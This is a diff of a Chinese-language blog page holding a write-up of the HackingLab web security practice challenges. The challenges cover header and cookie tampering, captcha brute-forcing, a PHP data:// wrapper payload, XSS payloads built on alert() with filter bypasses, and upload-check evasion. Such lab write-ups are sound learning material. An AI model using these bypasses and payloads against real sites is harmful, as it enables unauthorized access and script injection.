@@ -9,7 +9,8 @@
     
     <meta name="keywords" content="">
     <link rel="shortcut icon" href="/img/favicon.ico">
-    <link rel="stylesheet" href="/css/style.css?v=1.3.1">
+    <link rel="stylesheet" href="/css/third-party/swipebox.min.css?v=1.3.2">
+    <link rel="stylesheet" href="/css/style.css?v=1.3.2">
     
     <script type="text/javascript">
         // Data Center
@@ -25,7 +26,7 @@
         window.lazyScripts=[];
     </script>
     
-        <script type="text/javascript" src="/js/plugins/daovoice.js?v=1.3.1"></script>
+        <script type="text/javascript" src="/js/plugins/daovoice.js?v=1.3.2"></script>
     
 </head>
 
@@ -230,55 +231,55 @@
             <p><iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="298" height="52" src="//music.163.com/outchain/player?type=2&id=1296583188&auto=0&height=32"></iframe></p>
 <h3 id="基础关"><a href="#基础关" class="headerlink" title="基础关"></a>基础关</h3><h4 id="key在哪里"><a href="#key在哪里" class="headerlink" title="key在哪里?"></a>key在哪里?</h4><p>查看源代码，直接找到flag</p>
 <figure class="image-box">
-                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-14/9556473.jpg" alt="" title="" class="">
+                <a rel=hackinglab网络安全实验室writeup href="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-14/9556473.jpg" class="swipebox" title=undefined><img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-14/9556473.jpg" alt="" title="" class=""></a>
                 <p></p>
             </figure>
 <h4 id="再加密一次你就得到key啦"><a href="#再加密一次你就得到key啦" class="headerlink" title="再加密一次你就得到key啦~"></a>再加密一次你就得到key啦~</h4><p>给出的提示是：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">加密之后的数据为xrlvf23xfqwsxsqf</span><br></pre></td></tr></table></figure></p>
 <p>凯撒加密<br>移了13位，<a href="http://ctf.ssleye.com/caesar.html" target="_blank" rel="noopener">在线加密</a>选择移位<code>13</code>即可得到<code>key</code></p>
 <figure class="image-box">
-                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-14/47606007.jpg" alt="" title="" class="">
+                <a rel=hackinglab网络安全实验室writeup href="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-14/47606007.jpg" class="swipebox" title=undefined><img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-14/47606007.jpg" alt="" title="" class=""></a>
                 <p></p>
             </figure>
 <h4 id="猜猜这是经过了多少次加密？"><a href="#猜猜这是经过了多少次加密？" class="headerlink" title="猜猜这是经过了多少次加密？"></a>猜猜这是经过了多少次加密？</h4><p>一看就是<code>base64</code>，一直base64解码即可拿到key</p>
 <figure class="image-box">
-                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-14/40593997.jpg" alt="" title="" class="">
+                <a rel=hackinglab网络安全实验室writeup href="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-14/40593997.jpg" class="swipebox" title=undefined><img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-14/40593997.jpg" alt="" title="" class=""></a>
                 <p></p>
             </figure>
 <h4 id="据说MD5加密很安全，真的是么？"><a href="#据说MD5加密很安全，真的是么？" class="headerlink" title="据说MD5加密很安全，真的是么？"></a>据说MD5加密很安全，真的是么？</h4><p><a href="http://www.somd5.com/" target="_blank" rel="noopener">md5解密</a></p>
 <p>直接得到key</p>
 <figure class="image-box">
-                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-14/58077638.jpg" alt="" title="" class="">
+                <a rel=hackinglab网络安全实验室writeup href="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-14/58077638.jpg" class="swipebox" title=undefined><img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-14/58077638.jpg" alt="" title="" class=""></a>
                 <p></p>
             </figure>
 <h4 id="种族歧视"><a href="#种族歧视" class="headerlink" title="种族歧视"></a>种族歧视</h4><p>打开之后提示<code>only for Foreigner</code></p>
 <p>拿bp抓个包，将<code>Accept-Language:</code>这一栏的内容删掉即可</p>
 <figure class="image-box">
-                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-14/77260861.jpg" alt="" title="" class="">
+                <a rel=hackinglab网络安全实验室writeup href="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-14/77260861.jpg" class="swipebox" title=undefined><img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-14/77260861.jpg" alt="" title="" class=""></a>
                 <p></p>
             </figure>
 <h4 id="HAHA浏览器"><a href="#HAHA浏览器" class="headerlink" title="HAHA浏览器"></a>HAHA浏览器</h4><p>Hint:<br>据说信息安全小组最近出了一款新的浏览器，叫HAHA浏览器，有些题目必须通过HAHA浏览器才能答对。小明同学坚决不要装HAHA浏览器，怕有后门，但是如何才能过这个需要安装HAHA浏览器才能过的题目呢？<br>估计是改<code>user-agent</code><br>抓包,只要<code>user-agent</code>里出现<code>HAHA</code>即可得到key</p>
 <figure class="image-box">
-                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-14/25075365.jpg" alt="" title="" class="">
+                <a rel=hackinglab网络安全实验室writeup href="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-14/25075365.jpg" class="swipebox" title=undefined><img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-14/25075365.jpg" alt="" title="" class=""></a>
                 <p></p>
             </figure>
 <h4 id="key究竟在哪里呢？"><a href="#key究竟在哪里呢？" class="headerlink" title="key究竟在哪里呢？"></a>key究竟在哪里呢？</h4><p>访问后提示：Key就在这里，猜猜这里是哪里呢？(Web找key加强版)<br>抓个包，查看之后发现在响应头里：</p>
 <figure class="image-box">
-                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-14/44802568.jpg" alt="" title="" class="">
+                <a rel=hackinglab网络安全实验室writeup href="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-14/44802568.jpg" class="swipebox" title=undefined><img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-14/44802568.jpg" alt="" title="" class=""></a>
                 <p></p>
             </figure>
 <h4 id="key又找不到了"><a href="#key又找不到了" class="headerlink" title="key又找不到了"></a>key又找不到了</h4><p>照常抓包，发现一个<code>key_is_here_now_.php</code>,估计是个<code>302跳转</code>，用<code>bp</code>访问一下，即可得到key</p>
 <figure class="image-box">
-                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-14/52715712.jpg" alt="" title="" class="">
+                <a rel=hackinglab网络安全实验室writeup href="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-14/52715712.jpg" class="swipebox" title=undefined><img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-14/52715712.jpg" alt="" title="" class=""></a>
                 <p></p>
             </figure>
 <h4 id="冒充登陆用户"><a href="#冒充登陆用户" class="headerlink" title="冒充登陆用户"></a>冒充登陆用户</h4><p>访问后提示：<code>您还没有登陆呢！</code><br>抓包后发现<code>cookie</code>中有一个<code>login=0</code>的参数，改为<code>1</code>即可得到key</p>
 <figure class="image-box">
-                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-14/72734267.jpg" alt="" title="" class="">
+                <a rel=hackinglab网络安全实验室writeup href="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-14/72734267.jpg" class="swipebox" title=undefined><img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-14/72734267.jpg" alt="" title="" class=""></a>
                 <p></p>
             </figure>
 <h4 id="比较数字大小"><a href="#比较数字大小" class="headerlink" title="比较数字大小"></a>比较数字大小</h4><p>题目给了一个输入框，但是限制了长度，同样的，抓包，把<code>v</code>的值网大传，即可得到flag</p>
 <figure class="image-box">
-                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-14/62716700.jpg" alt="" title="" class="">
+                <a rel=hackinglab网络安全实验室writeup href="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-14/62716700.jpg" class="swipebox" title=undefined><img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-14/62716700.jpg" alt="" title="" class=""></a>
                 <p></p>
             </figure>
 <h4 id="本地的诱惑"><a href="#本地的诱惑" class="headerlink" title="本地的诱惑"></a>本地的诱惑</h4><p>题目坏了，但是这题的解题方法就是XFF，在发送包中添加<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">X-Forwarded-For:127.0.0.1</span><br></pre></td></tr></table></figure></p>
@@ -288,12 +289,12 @@
 <p>访问<code>/9fb97531fe95594603aff7e794ab2f5f/</code>,提示<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">you find me,but I am not the login page. keep search.</span><br></pre></td></tr></table></figure></p>
 <p>提示在<code>login page</code>，直接访问<code>login.php</code>，得到key</p>
 <figure class="image-box">
-                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-14/89095162.jpg" alt="" title="" class="">
+                <a rel=hackinglab网络安全实验室writeup href="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-14/89095162.jpg" class="swipebox" title=undefined><img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-14/89095162.jpg" alt="" title="" class=""></a>
                 <p></p>
             </figure>
 <h3 id="脚本关"><a href="#脚本关" class="headerlink" title="脚本关"></a>脚本关</h3><h4 id="key又又找不到了"><a href="#key又又找不到了" class="headerlink" title="key又又找不到了"></a>key又又找不到了</h4><p>也是抓包，但是直接看到key了…不清楚原因</p>
 <figure class="image-box">
-                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-14/75077819.jpg" alt="" title="" class="">
+                <a rel=hackinglab网络安全实验室writeup href="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-14/75077819.jpg" class="swipebox" title=undefined><img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-14/75077819.jpg" alt="" title="" class=""></a>
                 <p></p>
             </figure>
 <h4 id="快速口算"><a href="#快速口算" class="headerlink" title="快速口算"></a>快速口算</h4><p>请在2秒内口算结果并提交！</p>
@@ -301,39 +302,39 @@
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">import re </span><br><span class="line">import requests</span><br><span class="line"></span><br><span class="line">s = requests.Session()  </span><br><span class="line">url = &apos;http://1.hacklist.sinaapp.com/xss2_0d557e6d2a4ac08b749b61473a075be1/index.php&apos;</span><br><span class="line">r = s.get(url)</span><br><span class="line">num = re.findall(re.compile(r&apos;&lt;br/&gt;\s+(.*)=&lt;input&apos;), r.text)[0]  #正则匹配，可以先看看源代码</span><br><span class="line">r = s.post(url, data=&#123;&apos;v&apos;: eval(num)&#125;)  #计算表达式的值，并将结果提交  抓包可看出要用v提交</span><br><span class="line">print (r.text)  #输出结果</span><br></pre></td></tr></table></figure>
 <p>运行后得到key</p>
 <figure class="image-box">
-                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-14/66300172.jpg" alt="" title="" class="">
+                <a rel=hackinglab网络安全实验室writeup href="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-14/66300172.jpg" class="swipebox" title=undefined><img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-14/66300172.jpg" alt="" title="" class=""></a>
                 <p></p>
             </figure>
 <h4 id="这个题目是空的"><a href="#这个题目是空的" class="headerlink" title="这个题目是空的"></a>这个题目是空的</h4><p>这题有点坑，答案就是<code>null</code>小写</p>
 <h4 id="怎么就是不弹出key呢？"><a href="#怎么就是不弹出key呢？" class="headerlink" title="怎么就是不弹出key呢？"></a>怎么就是不弹出key呢？</h4><p>点了几次不行之后，看看源代码：</p>
 <figure class="image-box">
-                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-14/34069482.jpg" alt="" title="" class="">
+                <a rel=hackinglab网络安全实验室writeup href="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-14/34069482.jpg" class="swipebox" title=undefined><img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-14/34069482.jpg" alt="" title="" class=""></a>
                 <p></p>
             </figure>
 <p>可以看到各种<code>return false</code>，但是既然是js的代码，我们就可以在本地搭建<br>将代码复制到本地，然后把前面三个<code>return false</code>的函数干掉</p>
 <figure class="image-box">
-                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-14/55634205.jpg" alt="" title="" class="">
+                <a rel=hackinglab网络安全实验室writeup href="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-14/55634205.jpg" class="swipebox" title=undefined><img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-14/55634205.jpg" alt="" title="" class=""></a>
                 <p></p>
             </figure>
 <p>然后本地访问就行了</p>
 <figure class="image-box">
-                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-14/32380741.jpg" alt="" title="" class="">
+                <a rel=hackinglab网络安全实验室writeup href="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-14/32380741.jpg" class="swipebox" title=undefined><img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-14/32380741.jpg" alt="" title="" class=""></a>
                 <p></p>
             </figure>
 <p>注意是从<code>chars</code>之后开始的14位</p>
 <h4 id="逗比验证码第一期"><a href="#逗比验证码第一期" class="headerlink" title="逗比验证码第一期"></a>逗比验证码第一期</h4><p>这题的验证码验证一次之后不过期，所以。。<br>抓包爆破即可</p>
 <figure class="image-box">
-                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-14/87191568.jpg" alt="" title="" class="">
+                <a rel=hackinglab网络安全实验室writeup href="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-14/87191568.jpg" class="swipebox" title=undefined><img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-14/87191568.jpg" alt="" title="" class=""></a>
                 <p></p>
             </figure>
 <p>爆破之后，密码是1238，拿到key</p>
 <figure class="image-box">
-                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-14/91760909.jpg" alt="" title="" class="">
+                <a rel=hackinglab网络安全实验室writeup href="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-14/91760909.jpg" class="swipebox" title=undefined><img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-14/91760909.jpg" alt="" title="" class=""></a>
                 <p></p>
             </figure>
 <h4 id="逗比验证码第二期"><a href="#逗比验证码第二期" class="headerlink" title="逗比验证码第二期"></a>逗比验证码第二期</h4><p>题目给提示，验证就失效，但是实际上验证一次之后验证码就不需要了，令值为空即可开始爆破。</p>
 <figure class="image-box">
-                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-14/65751756.jpg" alt="" title="" class="">
+                <a rel=hackinglab网络安全实验室writeup href="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-14/65751756.jpg" class="swipebox" title=undefined><img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-14/65751756.jpg" alt="" title="" class=""></a>
                 <p></p>
             </figure>
 <p>爆破后得到密码1228，拿到key</p>
@@ -346,124 +347,124 @@
 <p>payload:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">^[^=data://text/plain;charset=unicode,(●&apos;◡&apos;●)</span><br></pre></td></tr></table></figure></p>
 <h4 id="逗比的手机验证码"><a href="#逗比的手机验证码" class="headerlink" title="逗比的手机验证码"></a>逗比的手机验证码</h4><p>这题不清楚为什么要出，没什么技术含量，<br>直接用13388886666手机号获取验证码，然后用13388886667<code>submit</code>就可以得到key</p>
 <figure class="image-box">
-                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-14/14383853.jpg" alt="" title="" class="">
+                <a rel=hackinglab网络安全实验室writeup href="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-14/14383853.jpg" class="swipebox" title=undefined><img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-14/14383853.jpg" alt="" title="" class=""></a>
                 <p></p>
             </figure>
 <h4 id="基情燃烧的岁月"><a href="#基情燃烧的岁月" class="headerlink" title="基情燃烧的岁月"></a>基情燃烧的岁月</h4><p>这题点击获取手机验证码之后提示<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">手机验证码是：验证码发到手机上了，你看不到..是3位纯数字，开头不为0</span><br></pre></td></tr></table></figure></p>
 <p>看不到，估计是爆破了，但是在爆破之前需要点击一下获取验证码，不然会一直提示错误，<br>然后第一次爆破的结果是：</p>
 <figure class="image-box">
-                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-14/20411096.jpg" alt="" title="" class="">
+                <a rel=hackinglab网络安全实验室writeup href="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-14/20411096.jpg" class="swipebox" title=undefined><img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-14/20411096.jpg" alt="" title="" class=""></a>
                 <p></p>
             </figure>
 <p>又得到一个手机号<code>13399999999</code>，同样的方法再爆破一次就能拿到key</p>
 <figure class="image-box">
-                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-14/62788792.jpg" alt="" title="" class="">
+                <a rel=hackinglab网络安全实验室writeup href="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-14/62788792.jpg" class="swipebox" title=undefined><img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-14/62788792.jpg" alt="" title="" class=""></a>
                 <p></p>
             </figure>
 <h4 id="验证码识别"><a href="#验证码识别" class="headerlink" title="验证码识别"></a>验证码识别</h4><p>这题前面的方法都不能用，只能老老实实的识别验证码了，因为全是数字，所以比较好识别，这里用的工具是<code>Pkav HTTP Fuzzer</code><br>使用方法：<br>将抓到的数据包内容复制粘贴进<code>请求包</code>处</p>
 <figure class="image-box">
-                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-14/74877318.jpg" alt="" title="" class="">
+                <a rel=hackinglab网络安全实验室writeup href="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-14/74877318.jpg" class="swipebox" title=undefined><img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-14/74877318.jpg" alt="" title="" class=""></a>
                 <p></p>
             </figure>
 <p>下方的使用与bp差不多，手机验证码变量<code>添加标记</code>即可，验证码变量<code>添加验证码</code>即可，<br>然后将验证码图片的地址复制下来，工具底部有<code>图片型验证码</code>，将地址复制进去，<br>在头部请求加上自己的cookie,<br>在下方点击识别测试：</p>
 <figure class="image-box">
-                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-14/37045585.jpg" alt="" title="" class="">
+                <a rel=hackinglab网络安全实验室writeup href="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-14/37045585.jpg" class="swipebox" title=undefined><img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-14/37045585.jpg" alt="" title="" class=""></a>
                 <p></p>
             </figure>
 <p>回到<code>变体设置</code>，设置自己payload，在重放设置栏选择数字自增长模式，</p>
 <figure class="image-box">
-                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-14/35105536.jpg" alt="" title="" class="">
+                <a rel=hackinglab网络安全实验室writeup href="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-14/35105536.jpg" class="swipebox" title=undefined><img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-14/35105536.jpg" alt="" title="" class=""></a>
                 <p></p>
             </figure>
 <p>在<code>重放选项</code>处将线程设置为<code>单线程</code>，因为速度过快可能会报错<br>然后底下选择<code>发包器</code>,点击启动即可，一段时间后得到flag</p>
 <figure class="image-box">
-                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-14/1709369.jpg" alt="" title="" class="">
+                <a rel=hackinglab网络安全实验室writeup href="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-14/1709369.jpg" class="swipebox" title=undefined><img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-14/1709369.jpg" alt="" title="" class=""></a>
                 <p></p>
             </figure>
 <h4 id="XSS基础关"><a href="#XSS基础关" class="headerlink" title="XSS基础关"></a>XSS基础关</h4><p>XSS的题目在<code>Google浏览器</code>里做不了，所以只能在其他浏览器下做了，这里用的是<code>火狐浏览器</code><br>XSS可以先看看js的代码，在<code>http://lab1.xseclab.com/xssjs/xss_check.php</code>处可以看到给出key的代码，先试试<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(HackingLab)&lt;/script&gt;</span><br></pre></td></tr></table></figure></p>
 <p>直接就success，得到了key</p>
 <figure class="image-box">
-                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-14/67919307.jpg" alt="" title="" class="">
+                <a rel=hackinglab网络安全实验室writeup href="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-14/67919307.jpg" class="swipebox" title=undefined><img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-14/67919307.jpg" alt="" title="" class=""></a>
                 <p></p>
             </figure>
 <h4 id="XSS基础2-简单绕过"><a href="#XSS基础2-简单绕过" class="headerlink" title="XSS基础2:简单绕过"></a>XSS基础2:简单绕过</h4><p>这题用上题的payload的话会报错，多试几次发现是过滤了<code>&lt;script&gt;</code>，<br>用<code>&lt;img&gt;</code>就能绕过<br>payload:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=haha onerror=alert(HackingLab)&gt;</span><br></pre></td></tr></table></figure></p>
 <figure class="image-box">
-                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-14/52247146.jpg" alt="" title="" class="">
+                <a rel=hackinglab网络安全实验室writeup href="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-14/52247146.jpg" class="swipebox" title=undefined><img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-14/52247146.jpg" alt="" title="" class=""></a>
                 <p></p>
             </figure>
 <h4 id="XSS基础3-检测与构造"><a href="#XSS基础3-检测与构造" class="headerlink" title="XSS基础3:检测与构造"></a>XSS基础3:检测与构造</h4><p>这题输入的值会在下方的<code>input</code>框展示出来，<br>同样过滤了<code>&lt;script&gt;</code>、<code>javascript</code>、<code>&lt;img src&gt;</code> ，但是当查看源代码的时候可以发现，<br><code>&#39;</code>没有过滤，所以可以用一下<code>闭合</code>的思想，用bp抓包试验一下</p>
 <figure class="image-box">
-                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-14/63393393.jpg" alt="" title="" class="">
+                <a rel=hackinglab网络安全实验室writeup href="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-14/63393393.jpg" class="swipebox" title=undefined><img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-14/63393393.jpg" alt="" title="" class=""></a>
                 <p></p>
             </figure>
 <p>输入<code>alert(HackingLab)</code>发现没有过滤<code>alert</code>，但是输入<code>onmouseover=alert(HackingLab)</code>，发现被检测到了，最终发现一个问题，当输入<code>alert</code>时，后面的添加的事件不会被过滤<br>构造payload:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">alert&apos;onmouseover=alert(HackingLab)&gt;</span><br></pre></td></tr></table></figure></p>
 <p>然后把鼠标移到第二个输入框即可弹窗，得到key:</p>
 <figure class="image-box">
-                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-14/48168602.jpg" alt="" title="" class="">
+                <a rel=hackinglab网络安全实验室writeup href="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-14/48168602.jpg" class="swipebox" title=undefined><img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-14/48168602.jpg" alt="" title="" class=""></a>
                 <p></p>
             </figure>
 <h4 id="Principle很重要的XSS"><a href="#Principle很重要的XSS" class="headerlink" title="Principle很重要的XSS"></a>Principle很重要的XSS</h4><p>这题跟上题类似，但是只是<code>input框</code>变成了<code>href</code>,我用上题的payload直接就得到key了。不清楚为什么给了这么多hint</p>
 <figure class="image-box">
-                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-20/74204887.jpg" alt="" title="" class="">
+                <a rel=hackinglab网络安全实验室writeup href="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-20/74204887.jpg" class="swipebox" title=undefined><img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-20/74204887.jpg" alt="" title="" class=""></a>
                 <p></p>
             </figure>
 <p>这些XSS的题目都可以用bp抓<code>响应包</code>来做，应该是后端没有做防护，这里就用最后一个题目做示范<br>首先抓到<code>请求包</code>，右键选择</p>
 <figure class="image-box">
-                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-20/74603677.jpg" alt="" title="" class="">
+                <a rel=hackinglab网络安全实验室writeup href="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-20/74603677.jpg" class="swipebox" title=undefined><img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-20/74603677.jpg" alt="" title="" class=""></a>
                 <p></p>
             </figure>
 <p>点击<code>Forward</code>，此时可以看到<code>响应包</code>也就是<code>response</code>包，<br>在下方输入<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=haha onerror=alert(HackingLab)&gt;</span><br></pre></td></tr></table></figure></p>
 <p>再点击<code>Forward</code>，因为数据包有点多，所以一直点击<code>Forward</code>直到弹窗就行，弹窗之后还需要点击<code>Forward</code>得到后台给的key，同样能得到<code>key</code></p>
 <figure class="image-box">
-                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-20/10523935.jpg" alt="" title="" class="">
+                <a rel=hackinglab网络安全实验室writeup href="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-20/10523935.jpg" class="swipebox" title=undefined><img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-20/10523935.jpg" alt="" title="" class=""></a>
                 <p></p>
             </figure>
 <h3 id="注入关"><a href="#注入关" class="headerlink" title="注入关"></a>注入关</h3><p>注入关暂时做不了，题目服务器有问题</p>
 <h3 id="上传关"><a href="#上传关" class="headerlink" title="上传关"></a>上传关</h3><h4 id="请上传一张jpg格式的图片1"><a href="#请上传一张jpg格式的图片1" class="headerlink" title="请上传一张jpg格式的图片1"></a>请上传一张jpg格式的图片1</h4><p>这题试了几次之后发现是前端验证,上传一个jpg，然后用bp抓包改一下即可拿到key</p>
 <figure class="image-box">
-                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-20/74649040.jpg" alt="" title="" class="">
+                <a rel=hackinglab网络安全实验室writeup href="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-20/74649040.jpg" class="swipebox" title=undefined><img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-20/74649040.jpg" alt="" title="" class=""></a>
                 <p></p>
             </figure>
 <h4 id="请上传一张jpg格式的图片2"><a href="#请上传一张jpg格式的图片2" class="headerlink" title="请上传一张jpg格式的图片2"></a>请上传一张jpg格式的图片2</h4><p>跟第一题一样的做法。</p>
 <h4 id="请上传一张jpg格式的图片3"><a href="#请上传一张jpg格式的图片3" class="headerlink" title="请上传一张jpg格式的图片3"></a>请上传一张jpg格式的图片3</h4><p>这题后端也做了验证，可以先用前面题目的方法试试，发现提交成功但是没有返回key</p>
 <figure class="image-box">
-                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-20/56022428.jpg" alt="" title="" class="">
+                <a rel=hackinglab网络安全实验室writeup href="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-20/56022428.jpg" class="swipebox" title=undefined><img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-20/56022428.jpg" alt="" title="" class=""></a>
                 <p></p>
             </figure>
 <p>试了试加一个.jpg</p>
 <figure class="image-box">
-                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-20/3655210.jpg" alt="" title="" class="">
+                <a rel=hackinglab网络安全实验室writeup href="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-20/3655210.jpg" class="swipebox" title=undefined><img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-20/3655210.jpg" alt="" title="" class=""></a>
                 <p></p>
             </figure>
 <p>后端代码可能是验证文件名有没有<code>.jpg</code>，拿到key</p>
 <h3 id="解密关"><a href="#解密关" class="headerlink" title="解密关"></a>解密关</h3><h4 id="以管理员身份登录系统"><a href="#以管理员身份登录系统" class="headerlink" title="以管理员身份登录系统"></a>以管理员身份登录系统</h4><p>打开题目发现这是一个标准的登录框，有<code>忘记密码</code>功能，并且题目提示重置管理员密码就能得到<code>key</code>，<br>先了解一下重置密码功能，在这个输入框中输入的值会被传到后端进行重置，<br>然后给出<code>重置密码链接</code>，但是<code>admin</code>用户重置之后没有提示,</p>
 <figure class="image-box">
-                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-20/83610629.jpg" alt="" title="" class="">
